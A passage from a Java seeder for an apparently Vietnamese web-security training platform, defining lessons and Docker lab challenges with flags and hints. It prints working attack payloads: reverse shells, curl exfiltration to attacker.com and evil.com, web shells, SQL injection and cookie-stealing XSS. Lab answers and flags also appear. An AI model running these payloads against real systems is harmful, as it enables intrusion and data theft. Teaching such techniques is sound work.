                    # Cross-Site Request Forgery (CSRF)

                    ## CSRF hoạt động như thế nào?

                    ```
                    1. Nạn nhân đăng nhập vào bank.com (có session cookie)
                    2. Nạn nhân truy cập trang web độc hại của kẻ tấn công
                    3. Trang độc hại tự động gửi request đến bank.com
                    4. Browser tự gửi kèm cookie → Request hợp lệ!
                    5. Tiền bị chuyển mà nạn nhân không biết
                    ```

                    ## Ví dụ tấn công CSRF

                    ### Trang web độc hại:
                    ```html
                    <html>
                    <body>
                        <h1>Chúc mừng bạn trúng thưởng!</h1>
                        <!-- Form ẩn tự động submit -->
                        <form action="https://bank.com/transfer" method="POST" id="evil-form">
                            <input type="hidden" name="to" value="hacker_account">
                            <input type="hidden" name="amount" value="10000000">
                        </form>
                        <script>
                            document.getElementById('evil-form').submit();
                        </script>
                    </body>
                    </html>
                    ```

                    ## Phòng chống CSRF

                    ### 1. CSRF Token
                    Server tạo token ngẫu nhiên, gửi cùng form:
                    ```html
                    <form action="/transfer" method="POST">
                        <input type="hidden" name="_csrf" value="random_token_abc123">
                        <!-- ... other fields ... -->
                    </form>
                    ```

                    ### 2. SameSite Cookie
                    ```
                    Set-Cookie: session=abc; SameSite=Strict
                    ```
                    Cookie không được gửi từ domain khác!
                    """)
                .build()
        ));

        // === INTERMEDIATE PATH LESSONS ===
        List<Lesson> intermediateLessons = lessonRepository.saveAll(List.of(
            Lesson.builder()
                .learningPath(intermediate)
                .title("Kỹ thuật khai thác SQL Injection nâng cao")
                .sortOrder(1)
                .vulnerability(sqli)
                .contentMarkdown("""
                    # SQL Injection nâng cao

                    ## Union-Based Injection

                    ### Xác định số cột
                    ```sql
                    ' ORDER BY 1 -- ✓
                    ' ORDER BY 2 -- ✓
                    ' ORDER BY 3 -- ✗ → Có 2 cột
                    ```

                    ### Trích xuất dữ liệu
                    ```sql
                    ' UNION SELECT table_name, column_name FROM information_schema.columns --
                    ' UNION SELECT username, password FROM users --
                    ```

                    ## Blind SQL Injection

                    ### Boolean-based
                    ```sql
                    ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
                    ```
                    - Nếu trang hiển thị bình thường → ký tự đầu tiên là 'a'
                    - Nếu trang khác → thử ký tự khác

                    ### Time-based
                    ```sql
                    ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
                    ```
                    - Nếu response chậm 5 giây → ký tự đúng

                    ## Second-Order SQL Injection
                    Payload được lưu trữ và thực thi sau:
                    1. Đăng ký username: `admin' --`
                    2. Khi thay đổi mật khẩu:
                    ```sql
                    UPDATE users SET password='new' WHERE username='admin' --'
                    ```
                    → Thay đổi mật khẩu admin!

                    ## Sử dụng sqlmap
                    ```bash
                    sqlmap -u "http://target.com/page?id=1" --dbs
                    sqlmap -u "http://target.com/page?id=1" -D dbname --tables
                    sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
                    ```
                    """)
                .build(),

            Lesson.builder()
                .learningPath(intermediate)
                .title("IDOR - Truy cập trái phép dữ liệu")
                .sortOrder(2)
                .vulnerability(idor)
                .contentMarkdown("""
                    # Insecure Direct Object Reference (IDOR)

                    ## Hiểu về IDOR
                    IDOR xảy ra khi server không kiểm tra quyền sở hữu tài nguyên:
                    ```
                    GET /api/users/1001/invoices   → Hóa đơn của bạn ✓
                    GET /api/users/1002/invoices   → Hóa đơn người khác ✗ (IDOR!)
                    ```

                    ## Các dạng IDOR phổ biến

                    ### 1. URL Parameter
                    ```
                    /profile?user_id=123
                    /download?file_id=456
                    /order/789/details
                    ```

                    ### 2. Request Body
                    ```json
                    POST /api/update-profile
                    {"user_id": 999, "email": "hacker@evil.com"}
                    ```

                    ### 3. Cookie / Header
                    ```
                    Cookie: user_id=123
                    X-User-Id: 123
                    ```

                    ## Kỹ thuật phát hiện IDOR

                    ### Sử dụng Burp Suite
                    1. Đăng nhập 2 tài khoản khác nhau
                    2. Chặn request của tài khoản A
                    3. Thay ID bằng ID của tài khoản B
                    4. Nếu trả về dữ liệu của B → IDOR!

                    ### Autorize Plugin
                    Burp extension tự động kiểm tra IDOR.

                    ## Phòng chống
                    ```java
                    // Luôn kiểm tra ownership
                    public Invoice getInvoice(UUID invoiceId, UUID currentUserId) {
                        Invoice invoice = invoiceRepo.findById(invoiceId);
                        if (!invoice.getUserId().equals(currentUserId)) {
                            throw new ForbiddenException("Access denied");
                        }
                        return invoice;
                    }
                    ```
                    """)
                .build(),

            Lesson.builder()
                .learningPath(intermediate)
                .title("Server-Side Request Forgery (SSRF)")
                .sortOrder(3)
                .vulnerability(ssrf)
                .contentMarkdown("""
                    # Server-Side Request Forgery (SSRF)

                    ## SSRF hoạt động như thế nào?
                    ```
                    Người dùng → Request đến Server → Server gọi URL do attacker chỉ định
                                                          ↓
                                                    Internal Network / Cloud Metadata
                    ```

                    ## Tình huống phổ biến
                    - Chức năng preview URL
                    - Import dữ liệu từ URL
                    - Webhook notifications
                    - PDF generator từ URL
                    - Image resize/proxy

                    ## Khai thác SSRF

                    ### Truy cập dịch vụ nội bộ
                    ```
                    POST /api/preview
                    {"url": "http://localhost:8080/admin"}
                    {"url": "http://192.168.1.100:3000/internal-api"}
                    ```

                    ### Cloud Metadata (AWS)
                    ```
                    http://169.254.169.254/latest/meta-data/
                    http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
                    ```
                    → Lấy được AWS credentials!

                    ### Quét port nội bộ
                    ```python
                    for port in range(1, 10000):
                        response = requests.post(target, json={"url": f"http://192.168.1.1:{port}"})
                        if response.status_code == 200:
                            print(f"Port {port} is open")
                    ```

                    ## Bypass kỹ thuật
                    | Kỹ thuật | Ví dụ |
                    |----------|-------|
                    | Decimal IP | `http://2130706433` = 127.0.0.1 |
                    | Octal IP | `http://0177.0.0.1` |
                    | IPv6 | `http://[::1]` |
                    | DNS rebinding | Domain → 127.0.0.1 |
                    | URL encoding | `http://127%2E0%2E0%2E1` |
                    """)
                .build(),

            Lesson.builder()
                .learningPath(intermediate)
                .title("Command Injection và khai thác OS")
                .sortOrder(4)
                .vulnerability(cmdi)
                .contentMarkdown("""
                    # Command Injection

                    ## Khi nào xảy ra Command Injection?
                    Khi ứng dụng truyền input vào system command:
                    ```java
                    // Vulnerable code
                    String cmd = "ping " + userInput;
                    Runtime.getRuntime().exec(cmd);
                    ```

                    ## Ký tự chèn lệnh
                    ```
                    ;     → Kết thúc lệnh, chạy lệnh mới
                    |     → Pipe output sang lệnh khác
                    &&    → Chạy lệnh tiếp nếu lệnh trước thành công
                    ||    → Chạy lệnh tiếp nếu lệnh trước thất bại
                    `cmd` → Command substitution
                    $(cmd)→ Command substitution
                    ```

                    ## Ví dụ thực tế
                    ```
                    # Chức năng ping trên web
                    Input: 8.8.8.8; cat /etc/passwd
                    Input: 8.8.8.8 && whoami
                    Input: 8.8.8.8 | ls -la /var/www/html
                    ```

                    ## Blind Command Injection
                    Khi không thấy output:
                    ```
                    # Time-based
                    8.8.8.8; sleep 10

                    # Out-of-band (OOB)
                    8.8.8.8; curl http://attacker.com/$(whoami)
                    8.8.8.8; nslookup $(cat /etc/hostname).attacker.com
                    ```

                    ## Reverse Shell
                    ```bash
                    # Bash
                    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

                    # Python
                    python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
                    ```
                    """)
                .build(),

            Lesson.builder()
                .learningPath(intermediate)
                .title("File Upload Vulnerabilities")
                .sortOrder(5)
                .vulnerability(fileUpload)
                .contentMarkdown("""
                    # File Upload Vulnerabilities

                    ## Tại sao File Upload nguy hiểm?
                    - Upload web shell → Remote Code Execution
                    - Upload file HTML → Stored XSS
                    - Upload file SVG → XSS
                    - Upload file lớn → Denial of Service
                    - Path traversal → Ghi đè file hệ thống

                    ## Web Shell phổ biến

                    ### PHP Web Shell
                    ```php
                    <?php echo system($_GET['cmd']); ?>
                    ```

                    ### JSP Web Shell
                    ```jsp
                    <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
                    ```

                    ## Bypass kiểm tra

                    ### Client-side validation
                    Dùng Burp Suite thay đổi request sau khi bypass JS validation.

                    ### Extension filter
                    ```
                    shell.php     → Bị chặn
                    shell.php5    → Có thể bypass
                    shell.phtml   → Có thể bypass
                    shell.php.jpg → Double extension
                    shell.php%00.jpg → Null byte
                    ```

                    ### Content-Type filter
                    ```
                    Thay Content-Type: application/x-php
                    Thành Content-Type: image/jpeg
                    ```

                    ### Magic bytes
                    ```
                    Thêm header file ảnh trước code:
                    GIF89a<?php system($_GET['cmd']); ?>
                    ```

                    ## Kiểm tra và phòng chống
                    1. Whitelist extension (chỉ cho phép .jpg, .png, .pdf)
                    2. Kiểm tra magic bytes thực tế
                    3. Đổi tên file thành UUID
                    4. Lưu file ngoài webroot
                    5. Serve file qua CDN riêng
                    """)
                .build()
        ));

        // === ADVANCED PATH LESSONS ===
        List<Lesson> advancedLessons = lessonRepository.saveAll(List.of(
            Lesson.builder()
                .learningPath(advanced)
                .title("Chuỗi tấn công (Attack Chains)")
                .sortOrder(1)
                .contentMarkdown("""
                    # Chuỗi tấn công (Attack Chains)

                    ## Khái niệm
                    Attack Chain là việc kết hợp nhiều lỗ hổng nhỏ thành một cuộc tấn công lớn:

                    ```
                    IDOR → Lấy email admin → Password Reset → Account Takeover
                    XSS → Đánh cắp cookie admin → CSRF → Tạo tài khoản admin mới
                    SSRF → Đọc AWS credentials → Truy cập S3 → Data Breach
                    ```

                    ## Case Study: Từ XSS đến RCE

                    ### Bước 1: Tìm Stored XSS
                    ```javascript
                    // Comment chứa XSS
                    <script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://evil.com/log',{method:'POST',body:JSON.stringify(d)}))</script>
                    ```

                    ### Bước 2: Chiếm quyền Admin
                    ```javascript
                    // XSS payload tạo admin account
                    fetch('/api/admin/create-user', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            username: 'backdoor',
                            password: 'secret',
                            role: 'admin'
                        })
                    });
                    ```

                    ### Bước 3: Khai thác tính năng admin
                    Admin panel có chức năng upload plugin → Upload web shell → RCE!

                    ## Phương pháp luận
                    1. **Recon**: Thu thập thông tin (subdomain, endpoint, tech stack)
                    2. **Map**: Vẽ bản đồ ứng dụng
                    3. **Discover**: Tìm lỗ hổng đơn lẻ
                    4. **Chain**: Kết hợp các lỗ hổng
                    5. **Impact**: Đánh giá tác động
                    6. **Report**: Viết báo cáo chi tiết
                    """)
                .build(),

            Lesson.builder()
                .learningPath(advanced)
                .title("JWT Security và tấn công Token")
                .sortOrder(2)
                .vulnerability(authBypass)
                .contentMarkdown("""
                    # JWT Security

                    ## Cấu trúc JWT
                    ```
                    Header.Payload.Signature

                    eyJhbGciOiJIUzI1NiJ9.       ← Header (Base64)
                    eyJzdWIiOiJhZG1pbiJ9.       ← Payload (Base64)
                    SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
                    ```

                    ## Các cuộc tấn công JWT

                    ### 1. Algorithm None Attack
                    ```json
                    // Thay đổi header
                    {"alg": "none", "typ": "JWT"}
                    // Payload
                    {"sub": "admin", "role": "admin"}
                    // Signature: để trống
                    ```

                    ### 2. Algorithm Confusion (RS256 → HS256)
                    ```
                    Server dùng RS256 (public/private key)
                    Attacker thay sang HS256
                    Ký bằng public key (public nên ai cũng có)
                    → Server verify bằng public key → Hợp lệ!
                    ```

                    ### 3. Brute Force Secret Key
                    ```bash
                    hashcat -m 16500 jwt.txt wordlist.txt
                    ```

                    ### 4. JKU/JWK Injection
                    ```json
                    {
                        "alg": "RS256",
                        "jku": "https://attacker.com/jwks.json"
                    }
                    ```

                    ## Phòng chống
                    - Whitelist algorithms ở server
                    - Sử dụng secret key đủ mạnh (256+ bits)
                    - Validate tất cả claims
                    - Thời hạn token ngắn
                    - Sử dụng refresh token rotation
                    """)
                .build(),

            Lesson.builder()
                .learningPath(advanced)
                .title("Bug Bounty - Phương pháp và kỹ thuật")
                .sortOrder(3)
                .contentMarkdown("""
                    # Bug Bounty Methodology

                    ## Quy trình Bug Bounty

                    ### Phase 1: Reconnaissance
                    ```bash
                    # Subdomain enumeration
                    subfinder -d target.com -o subdomains.txt
                    amass enum -d target.com

                    # Technology fingerprinting
                    whatweb target.com
                    wappalyzer

                    # Directory brute-force
                    gobuster dir -u https://target.com -w wordlist.txt

                    # JavaScript analysis
                    # Tìm API endpoints, secrets trong JS files
                    ```

                    ### Phase 2: Mapping
                    - Vẽ bản đồ tất cả endpoints
                    - Xác định input points
                    - Phân loại chức năng (auth, upload, search, ...)
                    - Sử dụng Burp Suite Sitemap

                    ### Phase 3: Vulnerability Discovery
                    ```
                    Mỗi input point → Test cho:
                    ├── SQL Injection
                    ├── XSS (Reflected + Stored)
                    ├── SSRF
                    ├── Command Injection
                    ├── IDOR
                    ├── CSRF
                    ├── File Upload
                    ├── Business Logic Flaws
                    └── Race Conditions
                    ```

                    ### Phase 4: Exploitation & PoC
                    - Tái hiện lỗ hổng một cách đáng tin cậy
                    - Đánh giá tác động thực tế
                    - Tạo Proof of Concept rõ ràng

                    ### Phase 5: Reporting
                    ```markdown
                    ## Tiêu đề: [Severity] - Mô tả ngắn gọn
                    ## Mức độ nghiêm trọng: Critical/High/Medium/Low
                    ## URL bị ảnh hưởng: https://target.com/vulnerable-endpoint
                    ## Mô tả: Chi tiết lỗ hổng
                    ## Steps to Reproduce: Từng bước tái hiện
                    ## Impact: Tác động thực tế
                    ## Remediation: Đề xuất sửa lỗi
                    ```

                    ## Nền tảng Bug Bounty
                    - HackerOne
                    - Bugcrowd
                    - Synack
                    - Intigriti
                    """)
                .build(),

            Lesson.builder()
                .learningPath(advanced)
                .title("Phương pháp luận kiểm thử OWASP")
                .sortOrder(4)
                .contentMarkdown("""
                    # OWASP Testing Guide

                    ## OWASP Testing Framework
                    OWASP cung cấp phương pháp luận kiểm thử có hệ thống:

                    ### 1. Information Gathering
                    - Fingerprint Web Server
                    - Review Web Application Metafiles
                    - Enumerate Applications
                    - Review Page Content

                    ### 2. Configuration Management Testing
                    - Network Infrastructure
                    - Application Platform
                    - File Extensions Handling
                    - HTTP Methods
                    - HTTP Strict Transport Security

                    ### 3. Identity Management Testing
                    - Role Definitions
                    - User Registration Process
                    - Account Provisioning
                    - Account Enumeration

                    ### 4. Authentication Testing
                    - Default Credentials
                    - Lock-out Mechanism
                    - Bypassing Authentication Schema
                    - Browser Cache Management
                    - Password Policy
                    - Multi-Factor Authentication

                    ### 5. Authorization Testing
                    - Directory Traversal
                    - Bypassing Authorization Schema
                    - Privilege Escalation
                    - IDOR

                    ### 6. Session Management Testing
                    - Session Management Schema
                    - Cookie Attributes
                    - Session Fixation
                    - CSRF

                    ### 7. Input Validation Testing
                    - XSS, SQL Injection, LDAP Injection
                    - XML Injection, SSI Injection
                    - Command Injection, Buffer Overflow
                    - HTTP Splitting/Smuggling

                    ## Công cụ kiểm thử
                    | Công cụ | Mục đích |
                    |---------|----------|
                    | Burp Suite Pro | Proxy, scanner |
                    | OWASP ZAP | Alternative free proxy |
                    | Nmap | Network scanning |
                    | Nikto | Web server scanner |
                    | Nuclei | Template-based scanner |
                    | ffuf | Fuzzing |
                    """)
                .build()
        ));

        int totalLessons = beginnerLessons.size() + intermediateLessons.size() + advancedLessons.size();
        log.info("  ✓ {} Lessons seeded", totalLessons);
    }

    private void seedLabs(List<Vulnerability> vulns) {
        Vulnerability sqli = vulns.get(0);
        Vulnerability xss = vulns.get(1);
        Vulnerability csrf = vulns.get(2);
        Vulnerability idor = vulns.get(3);
        Vulnerability ssrf = vulns.get(4);
        Vulnerability cmdi = vulns.get(5);
        Vulnerability fileUpload = vulns.get(6);
        Vulnerability authBypass = vulns.get(7);

        List<Lab> labs = labRepository.saveAll(List.of(
            // SQL Injection Labs
            Lab.builder()
                .vulnerability(sqli)
                .title("SQL Injection - Đăng nhập Admin")
                .description("Bypass trang đăng nhập bằng SQL Injection. Mục tiêu: đăng nhập với quyền admin mà không cần biết mật khẩu. Ứng dụng sử dụng truy vấn SQL trực tiếp ghép chuỗi từ input người dùng.")
                .difficulty(LearningPath.Difficulty.BEGINNER)
                .dockerImage("sechub/sqli-login:latest")
                .dockerPort(8081)
                .flag("FLAG{sql1_l0g1n_byp4ss_2024}")
                .hintsJson("""
                    ["Thử thêm dấu nháy đơn (') vào trường username",
                     "Sử dụng payload: admin' -- để comment phần kiểm tra mật khẩu",
                     "Payload đầy đủ: admin' OR '1'='1' --"]
                    """)
                .estimatedMinutes(20)
                .points(100)
                .build(),

            Lab.builder()
                .vulnerability(sqli)
                .title("SQL Injection - Trích xuất dữ liệu với UNION")
                .description("Sử dụng kỹ thuật UNION-based SQL Injection để trích xuất danh sách người dùng và mật khẩu từ database. Ứng dụng có chức năng tìm kiếm sản phẩm bị lỗi SQLi.")
                .difficulty(LearningPath.Difficulty.INTERMEDIATE)
                .dockerImage("sechub/sqli-union:latest")
                .dockerPort(8082)
                .flag("FLAG{un10n_s3l3ct_m4st3r}")
                .hintsJson("""
                    ["Tìm số cột bằng ORDER BY",
                     "Sử dụng UNION SELECT để ghép kết quả",
                     "Truy vấn information_schema.tables để tìm tên bảng",
                     "SELECT username, password FROM users"]
                    """)
                .estimatedMinutes(30)
                .points(200)
                .build(),

            Lab.builder()
                .vulnerability(sqli)
                .title("Blind SQL Injection - Trích xuất từng ký tự")
                .description("Khai thác Blind SQL Injection khi ứng dụng không hiển thị kết quả truy vấn. Sử dụng kỹ thuật boolean-based hoặc time-based để trích xuất mật khẩu admin từng ký tự một.")
                .difficulty(LearningPath.Difficulty.ADVANCED)
                .dockerImage("sechub/sqli-blind:latest")
                .dockerPort(8083)
                .flag("FLAG{bl1nd_sql1_pr0}")
                .hintsJson("""
                    ["Quan sát sự khác biệt của response khi điều kiện đúng/sai",
                     "Sử dụng SUBSTRING() để lấy từng ký tự",
                     "Thử time-based: IF(condition, SLEEP(5), 0)",
                     "Hoặc sử dụng sqlmap để tự động hóa"]
                    """)
                .estimatedMinutes(45)
                .points(300)
                .build(),

            // XSS Labs
            Lab.builder()
                .vulnerability(xss)
                .title("Reflected XSS - Tìm kiếm")
                .description("Tìm và khai thác lỗ hổng Reflected XSS trong chức năng tìm kiếm. Mục tiêu: thực thi alert(document.domain) thành công.")
                .difficulty(LearningPath.Difficulty.BEGINNER)
                .dockerImage("sechub/xss-reflected:latest")
                .dockerPort(8084)
                .flag("FLAG{r3fl3ct3d_xss_f0und}")
                .hintsJson("""
                    ["Nhập <script>alert(1)</script> vào ô tìm kiếm",
                     "Nếu bị filter, thử <img src=x onerror=alert(1)>",
                     "Kiểm tra source code để thấy input được render như thế nào"]
                    """)
                .estimatedMinutes(15)
                .points(100)
                .build(),

            Lab.builder()
                .vulnerability(xss)
                .title("Stored XSS - Đánh cắp Cookie")
                .description("Khai thác Stored XSS trong hệ thống bình luận để đánh cắp cookie của admin. Mục tiêu: gửi cookie của admin về server của bạn.")
                .difficulty(LearningPath.Difficulty.INTERMEDIATE)
                .dockerImage("sechub/xss-stored:latest")
                .dockerPort(8085)
                .flag("FLAG{st0r3d_xss_c00k13_th13f}")
                .hintsJson("""
                    ["Đăng comment chứa script tag",
                     "Sử dụng fetch() hoặc new Image() để gửi cookie đi",
                     "Payload: <script>new Image().src='http://your-server/?c='+document.cookie</script>",
                     "Cookie của admin chứa flag"]
                    """)
                .estimatedMinutes(30)
                .points(200)
                .build(),

            // CSRF Lab
            Lab.builder()
                .vulnerability(csrf)
                .title("CSRF - Thay đổi email người dùng")
                .description("Tạo trang web độc hại để thay đổi email của nạn nhân mà không cần sự đồng ý. Ứng dụng target không có CSRF protection.")
                .difficulty(LearningPath.Difficulty.BEGINNER)
                .dockerImage("sechub/csrf-email:latest")
                .dockerPort(8086)
                .flag("FLAG{csrf_3m41l_ch4ng3d}")
                .hintsJson("""
                    ["Tạo file HTML với form ẩn trỏ đến endpoint thay đổi email",
                     "Form phải tự động submit khi trang load",
                     "Sử dụng <body onload='document.forms[0].submit()'>"]
                    """)
                .estimatedMinutes(20)
                .points(100)
                .build(),

            // IDOR Labs
            Lab.builder()
                .vulnerability(idor)
                .title("IDOR - Xem hồ sơ người dùng khác")
                .description("Khai thác IDOR để truy cập thông tin cá nhân của người dùng khác. API sử dụng ID tuần tự và không kiểm tra quyền sở hữu.")
                .difficulty(LearningPath.Difficulty.BEGINNER)
                .dockerImage("sechub/idor-profile:latest")
                .dockerPort(8087)
                .flag("FLAG{1d0r_pr0f1l3_l34k}")
                .hintsJson("""
                    ["Đăng nhập và xem URL khi truy cập profile của bạn",
                     "Thay đổi user ID trong URL",
                     "Thử các ID từ 1 đến 10",
                     "Một trong các profile chứa flag"]
                    """)
                .estimatedMinutes(15)
                .points(100)
                .build(),

            Lab.builder()
                .vulnerability(idor)
                .title("IDOR - Thay đổi vai trò người dùng")
                .description("Khai thác IDOR trong API cập nhật profile để nâng quyền từ user thường lên admin. Mục tiêu: truy cập được trang admin dashboard.")
                .difficulty(LearningPath.Difficulty.INTERMEDIATE)
                .dockerImage("sechub/idor-privilege:latest")
                .dockerPort(8088)
                .flag("FLAG{1d0r_pr1v1l3g3_3sc4l4t10n}")
                .hintsJson("""
                    ["Chặn request cập nhật profile bằng Burp Suite",
                     "Thêm field 'role' vào request body",
                     "Thử gửi role: 'admin' trong JSON body",
                     "Sau khi nâng quyền, truy cập /admin/dashboard"]
                    """)
                .estimatedMinutes(25)
                .points(200)
                .build(),

            // SSRF Lab
            Lab.builder()
                .vulnerability(ssrf)
                .title("SSRF - Đọc file nội bộ")
                .description("Khai thác SSRF trong chức năng preview URL để đọc file nội bộ và truy cập dịch vụ ẩn. Ứng dụng cho phép nhập URL để xem nội dung.")
                .difficulty(LearningPath.Difficulty.INTERMEDIATE)
                .dockerImage("sechub/ssrf-basic:latest")
                .dockerPort(8089)
                .flag("FLAG{ssrf_1nt3rn4l_4cc3ss}")
                .hintsJson("""
                    ["Thử nhập http://localhost hoặc http://127.0.0.1",
                     "Thử các port phổ biến: 3000, 8080, 6379",
                     "Sử dụng file:///etc/passwd để đọc file",
                     "Tìm service chạy trên port nội bộ chứa flag"]
                    """)
                .estimatedMinutes(30)
                .points(200)
                .build(),

            // Command Injection Lab
            Lab.builder()
                .vulnerability(cmdi)
                .title("Command Injection - Ping Tool")
                .description("Khai thác Command Injection trong công cụ ping online. Ứng dụng cho phép nhập IP để ping nhưng không lọc input đúng cách.")
                .difficulty(LearningPath.Difficulty.BEGINNER)
                .dockerImage("sechub/cmdi-ping:latest")
                .dockerPort(8090)
                .flag("FLAG{c0mm4nd_1nj3ct10n_p1ng}")
                .hintsJson("""
                    ["Thử thêm dấu ; sau địa chỉ IP",
                     "Payload: 127.0.0.1; cat /flag.txt",
                     "Nếu ; bị chặn, thử || hoặc &&",
                     "Flag nằm trong file /flag.txt trên server"]
                    """)
                .estimatedMinutes(15)
                .points(100)
                .build(),

            Lab.builder()
                .vulnerability(cmdi)
                .title("Blind Command Injection")
                .description("Khai thác Blind Command Injection khi output không hiển thị. Sử dụng kỹ thuật out-of-band hoặc time-based để xác nhận và trích xuất dữ liệu.")
                .difficulty(LearningPath.Difficulty.ADVANCED)
                .dockerImage("sechub/cmdi-blind:latest")
                .dockerPort(8091)
                .flag("FLAG{bl1nd_cmd1_0ob}")
                .hintsJson("""
                    ["Output không hiển thị - thử time-based: ; sleep 5",
                     "Nếu response chậm 5 giây → Command Injection xác nhận!",
                     "Dùng curl/wget để gửi data ra ngoài",
                     "Payload: ; curl http://your-server/$(cat /flag.txt)"]
                    """)
                .estimatedMinutes(40)
                .points(300)
                .build(),

            // File Upload Lab
            Lab.builder()
                .vulnerability(fileUpload)
                .title("File Upload - Bypass Extension Filter")
                .description("Upload web shell lên server bằng cách bypass bộ lọc extension. Ứng dụng chỉ kiểm tra extension phía client và Content-Type cơ bản.")
                .difficulty(LearningPath.Difficulty.INTERMEDIATE)
                .dockerImage("sechub/upload-bypass:latest")
                .dockerPort(8092)
                .flag("FLAG{f1l3_upl04d_byp4ss}")
                .hintsJson("""
                    ["Thử đổi extension: .php → .php5, .phtml",
                     "Sử dụng Burp Suite để thay đổi Content-Type",
                     "Thay Content-Type thành image/jpeg nhưng giữ nội dung PHP",
                     "Thử double extension: shell.php.jpg"]
                    """)
                .estimatedMinutes(25)
                .points(200)
                .build(),

            // Auth Bypass Labs
            Lab.builder()
                .vulnerability(authBypass)
                .title("Authentication Bypass - JWT None Algorithm")
                .description("Khai thác lỗ hổng JWT algorithm confusion. Server không validate algorithm đúng cách, cho phép sử dụng 'none' algorithm để tạo token giả mạo.")
                .difficulty(LearningPath.Difficulty.INTERMEDIATE)
                .dockerImage("sechub/jwt-none:latest")
                .dockerPort(8093)
                .flag("FLAG{jwt_n0n3_4lg0_byp4ss}")
                .hintsJson("""
                    ["Decode JWT token hiện tại (jwt.io)",
                     "Thay đổi header: alg thành 'none'",
                     "Thay đổi payload: role thành 'admin'",
                     "Encode lại và gửi token mới (bỏ phần signature)"]
                    """)
                .estimatedMinutes(30)
                .points(200)
                .build(),

            Lab.builder()
                .vulnerability(authBypass)
                .title("Authentication Bypass - Brute Force Login")
                .description("Tìm mật khẩu admin bằng brute force. Ứng dụng không có rate limiting hay account lockout. Sử dụng danh sách mật khẩu phổ biến để tìm thông tin đăng nhập.")
                .difficulty(LearningPath.Difficulty.BEGINNER)
                .dockerImage("sechub/auth-bruteforce:latest")
                .dockerPort(8094)
                .flag("FLAG{brut3_f0rc3_n0_r4t3_l1m1t}")
                .hintsJson("""
                    ["Username mặc định thường là admin",
                     "Sử dụng Burp Intruder hoặc Hydra",
                     "Thử danh sách top 100 mật khẩu phổ biến",
                     "Mật khẩu nằm trong rockyou top 1000"]
                    """)
                .estimatedMinutes(20)
                .points(100)
                .build()
        ));

        log.info("  ✓ {} Labs seeded", labs.size());
    }
}
